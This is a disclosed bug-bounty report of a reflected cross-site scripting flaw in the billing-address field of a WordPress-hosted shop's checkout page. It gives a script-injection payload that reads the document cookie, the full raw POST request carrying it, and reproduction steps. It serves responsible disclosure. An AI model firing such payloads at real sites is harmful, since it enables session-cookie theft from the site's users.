# xss - reflected

## Report Details
- **Report ID**: 384112
- **URL**: https://hackerone.com/reports/384112
- **State**: Closed
- **Severity**: low
- **Submitted**: 2018-07-19T10:54:17.989Z
- **Disclosed**: 2018-07-24T13:17:31.047Z

## Reporter
- **Username**: arunthelegion
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: wordpress

## Vulnerability Information
vulnerable url:  http://masterplan.wordpress.net/store/checkout/

payload:  1 Main Streetzbn0b\"><script>alert(document.cookie)</script>k8ez0

vulnerable parameter: billing-address

Request:

POST /store/checkout/ HTTP/1.1
Host: masterplan.wordpress.net
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Referer: http://masterplan.wordpress.net/store/checkout/
Content-Type: application/x-www-form-urlencoded
Content-Length: 814
Cookie: PHPSESSID=a040c364fca0ec1d75201d8aaee61546; wordpress_test_cookie=WP+Cookie+check

billing%5baddress%5d=1%20Main%20Streetzbn0b%22%3e%3cscript%3ealert(document.cookie)%3c%2fscript%3ek8ez0&shipping%5bzip%5d=36310&billing%5bcountry%5d=AR&shipping%5baddress2%5d=1+Main+Street&payment%5bcardNumber%5d=555-555-0199@example.com&shipping%5bfirstName%5d=Peter&billing%5blastName%5d=Winter&shipping%5bcountry%5d=AR&payment%5bcardExpirationYear%5d=2018&billing%5bcity%5d=Winterville&billing%5bzip%5d=36310&shipping%5bcity%5d=Winterville&billing%5baddress2%5d=1+Main+Street&shipping%5blastName%5d=Winter&payment%5bsecurityId%5d=555-555-0199@example.com&shipping%5baddress%5d=1+Main+Street&payment%5bcardExpirationMonth%5d=01&payment%5bphone%5d=555-555-0199&payment%5bcardType%5d=Mastercard&billing%5bfirstName%5d=Peter&phpurchase-action=paypalprocheckout&sameAsBilling=on&payment%5bemail%5d=winter@example.com


Steps to reproduce:

1. get the request in burp repeater
2. see the response in browser
3. it will prompt you the session id.

## Impact

https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)

## Attachments
- xss_wp_high.PNG
